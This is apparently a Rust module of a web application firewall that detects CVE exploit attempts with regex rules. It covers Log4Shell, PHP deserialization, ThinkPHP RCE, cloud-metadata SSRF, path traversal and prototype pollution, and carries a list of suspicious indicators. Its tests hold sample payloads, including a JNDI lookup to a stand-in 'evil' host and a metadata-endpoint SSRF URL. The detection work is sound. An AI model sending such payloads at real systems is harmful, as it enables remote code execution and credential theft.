//! CVE 检测子系统（对齐 Go internal/waf/cve）：静态规则检测核心。
//! 移植 CveRequest/CveMatch/CveRule + 编排 detect_cve + 可疑预筛 + multi_decode + pick_target。
//! 各技术栈（general/php/java/node）规则表代表性填充；NVD/GitHub feed 同步与 DB 自定义规则依赖
//! 持久层，归 P4/数据面，本层不含。全表保真留待后续 parity pass。

use std::sync::LazyLock;

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use regex::Regex;

use crate::normalize::query_unescape;

/// 一次 CVE 命中（对齐 Go CVEMatch）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CveMatch {
    pub cve_id: String,
    pub category: String,
    pub severity: String,
    pub description: String,
    pub matched_part: String,
    pub action: String,
}

/// 归一化后的 CVE 扫描请求（对齐 Go CVERequest）。headers 以 (name, value) 切片承载，框架无关。
pub struct CveRequest {
    pub path: String,
    pub raw_query: String,
    pub headers: Vec<(String, String)>,
    pub body: String,
    pub content_type: String,
    pub decoded_path: String,
    pub decoded_query: String,
    pub decoded_body: String,
    pub all_targets: Vec<String>,
    pub all_targets_lower: Vec<String>,
}

/// 一条 CVE 规则（对齐 Go xCVERule）：多正则 AND 语义，target 选定匹配部位。
struct CveRule {
    cve_id: &'static str,
    category: &'static str,
    severity: &'static str,
    description: &'static str,
    target: &'static str,
    patterns: Vec<Regex>,
    action: &'static str,
}

/// 非 panic 构造规则：任一正则编译失败则整条丢弃（静态模式不会失败，仅为遵守零 unwrap/expect）。
fn rule(
    cve_id: &'static str,
    category: &'static str,
    severity: &'static str,
    description: &'static str,
    target: &'static str,
    pats: &[&str],
    action: &'static str,
) -> Option<CveRule> {
    let mut patterns = Vec::with_capacity(pats.len());
    for p in pats {
        patterns.push(Regex::new(&format!("(?i){p}")).ok()?);
    }
    Some(CveRule {
        cve_id,
        category,
        severity,
        description,
        target,
        patterns,
        action,
    })
}

/// 内置 CVE 规则表（代表性子集，覆盖 general/php/java/node 四类）。
static CVE_RULES: LazyLock<Vec<CveRule>> = LazyLock::new(|| {
    [
        rule(
            "CVE-2021-44228",
            "cve_java",
            "critical",
            "Log4Shell JNDI lookup injection",
            "all",
            &[r"\$\{jndi:(ldap|ldaps|rmi|dns|nis|iiop|corba)"],
            "drop",
        ),
        rule(
            "CVE-2015-6835",
            "cve_php",
            "high",
            "PHP object deserialization via serialized object pattern",
            "all",
            &[r#"o:\d+:""#],
            "block",
        ),
        rule(
            "CVE-2018-20062",
            "cve_php",
            "critical",
            "ThinkPHP invokefunction RCE",
            "url",
            &[
                r"invokefunction",
                r"filter\[\]\s*=\s*(system|exec|passthru|shell_exec|call_user_func)",
            ],
            "drop",
        ),
        rule(
            "CVE-GENERIC-SSRF",
            "cve_general",
            "high",
            "SSRF to cloud metadata endpoint",
            "all",
            &[r"(169\.254\.169\.254|metadata\.google\.internal)"],
            "block",
        ),
        rule(
            "CVE-GENERIC-LFI",
            "cve_general",
            "high",
            "Path traversal to sensitive file",
            "all",
            &[r"(\.\./){2,}|etc/passwd|/wp-config\.php|/\.env\b"],
            "block",
        ),
        rule(
            "CVE-GENERIC-PROTO",
            "cve_node",
            "high",
            "Node.js prototype pollution",
            "all",
            &[r"(__proto__|constructor\s*\[|prototype\[)"],
            "block",
        ),
    ]
    .into_iter()
    .flatten()
    .collect()
});

/// >0.8 可打印字节占比（对齐 Go isPrintable）。
fn is_printable(b: &[u8]) -> bool {
    if b.is_empty() {
        return false;
    }
    let printable = b
        .iter()
        .filter(|&&c| (0x20..=0x7e).contains(&c) || c == b'\n' || c == b'\r' || c == b'\t')
        .count();
    printable as f64 / b.len() as f64 > 0.8
}

/// 双重 URL 解码 + 原串 base64 尝试（对齐 Go multiDecode）。
fn multi_decode(s: &str) -> String {
    if s.is_empty() {
        return String::new();
    }
    let d1 = query_unescape(s).unwrap_or_else(|| s.to_string());
    let d2 = query_unescape(&d1).unwrap_or(d1);
    if let Ok(b) = STANDARD.decode(s)
        && !b.is_empty()
        && is_printable(&b)
    {
        return format!("{d2}\u{0}{}", String::from_utf8_lossy(&b));
    }
    d2
}

/// 构造归一化 CVE 请求（对齐 Go BuildCVERequest）。
pub fn build_cve_request(
    path: &str,
    raw_query: &str,
    headers: Vec<(String, String)>,
    body: &str,
    content_type: &str,
) -> CveRequest {
    let decoded_path = multi_decode(path);
    let decoded_query = multi_decode(raw_query);
    let decoded_body = multi_decode(body);

    let mut all_targets = vec![path.to_string(), decoded_path.clone()];
    if !raw_query.is_empty() {
        all_targets.push(raw_query.to_string());
        all_targets.push(decoded_query.clone());
    }
    for (_, v) in &headers {
        all_targets.push(v.clone());
    }
    if !content_type.is_empty() {
        all_targets.push(content_type.to_string());
    }
    if !body.is_empty() {
        all_targets.push(body.to_string());
        all_targets.push(decoded_body.clone());
    }
    let all_targets_lower = all_targets.iter().map(|t| t.to_lowercase()).collect();

    CveRequest {
        path: path.to_string(),
        raw_query: raw_query.to_string(),
        headers,
        body: body.to_string(),
        content_type: content_type.to_string(),
        decoded_path,
        decoded_query,
        decoded_body,
        all_targets,
        all_targets_lower,
    }
}

/// CVE 可疑内容预筛（对齐 Go hasCVESuspiciousContent：字符集 + 代表性子串子集）。
fn has_cve_suspicious_content(req: &CveRequest) -> bool {
    const INDICATORS: &[&str] = &[
        "http://",
        "https://",
        "file://",
        "php://",
        "169.254.169.254",
        "metadata.google",
        "jndi:",
        "__proto__",
        "constructor",
        "child_process",
        "invokefunction",
        "classloader",
        "serializ",
        "<!doctype",
        "<!entity",
        "../",
        "..\\",
        "%2e%2e",
        "rememberme=",
        "@type",
        "ognl",
        "getruntime",
        "processbuilder",
        "java.lang.runtime",
        "rmi://",
        "ldap://",
        "jdbc:",
        "....//",
        "objectclass=",
        "$where",
        "$ne",
        "$gt",
        "$regex",
        "/.env",
        "/wp-config.php",
        "/etc/passwd",
        "/etc/shadow",
        "whoami",
        "uname",
    ];
    for (i, t) in req.all_targets.iter().enumerate() {
        if t.len() < 3 {
            continue;
        }
        if t.contains([
            '$', '{', '}', '(', ')', '[', ']', '<', '>', '\\', '|', ';', '`',
        ]) {
            return true;
        }
        let lower = &req.all_targets_lower[i];
        if INDICATORS.iter().any(|ind| lower.contains(ind)) {
            return true;
        }
    }
    false
}

/// 按 target 选定匹配部位（对齐 Go pickTarget）。
fn pick_target(req: &CveRequest, target: &str) -> String {
    match target {
        "url" => format!("{}?{}", req.decoded_path, req.decoded_query),
        "body" => req.decoded_body.clone(),
        "header" => {
            let mut sb = String::new();
            for (_, v) in &req.headers {
                sb.push_str(v);
                sb.push('\n');
            }
            sb
        }
        "cookie" => req
            .headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("cookie"))
            .map(|(_, v)| v.clone())
            .unwrap_or_default(),
        _ => req.all_targets.join("\n"),
    }
}

/// CVE 检测主入口（对齐 Go CVEDetector.Detect 的静态规则部分）。
/// `disabled_categories` 中的类别（如 "cve_java"）整类跳过；custom/registry 规则归后续阶段。
pub fn detect_cve(req: &CveRequest, disabled_categories: &[&str]) -> Vec<CveMatch> {
    if !has_cve_suspicious_content(req) {
        return Vec::new();
    }
    let mut matches = Vec::new();
    for r in CVE_RULES.iter() {
        if disabled_categories.contains(&r.category) {
            continue;
        }
        let target = pick_target(req, r.target);
        if r.patterns.iter().all(|re| re.is_match(&target)) {
            matches.push(CveMatch {
                cve_id: r.cve_id.to_string(),
                category: r.category.to_string(),
                severity: r.severity.to_string(),
                description: r.description.to_string(),
                matched_part: r.target.to_string(),
                action: r.action.to_string(),
            });
        }
    }
    matches
}

#[cfg(test)]
mod tests {
    use super::*;

    fn req(path: &str, query: &str, body: &str) -> CveRequest {
        build_cve_request(path, query, Vec::new(), body, "")
    }

    #[test]
    fn log4shell_detected() {
        let r = req("/", "x=${jndi:ldap://evil/a}", "");
        let m = detect_cve(&r, &[]);
        assert!(m.iter().any(|h| h.cve_id == "CVE-2021-44228"));
    }

    #[test]
    fn log4shell_skipped_when_java_disabled() {
        let r = req("/", "x=${jndi:ldap://evil/a}", "");
        let m = detect_cve(&r, &["cve_java"]);
        assert!(m.is_empty());
    }

    #[test]
    fn php_deser_detected_in_body() {
        let r = req("/", "", r#"data=O:8:"Exploit":1:{}"#);
        let m = detect_cve(&r, &[]);
        assert!(m.iter().any(|h| h.cve_id == "CVE-2015-6835"));
    }

    #[test]
    fn ssrf_metadata_detected() {
        let r = req("/", "url=http://169.254.169.254/latest/meta-data", "");
        let m = detect_cve(&r, &[]);
        assert!(m.iter().any(|h| h.category == "cve_general"));
    }

    #[test]
    fn clean_request_no_match() {
        let r = req("/api/users", "name=john&age=30", "");
        assert!(detect_cve(&r, &[]).is_empty());
    }
}
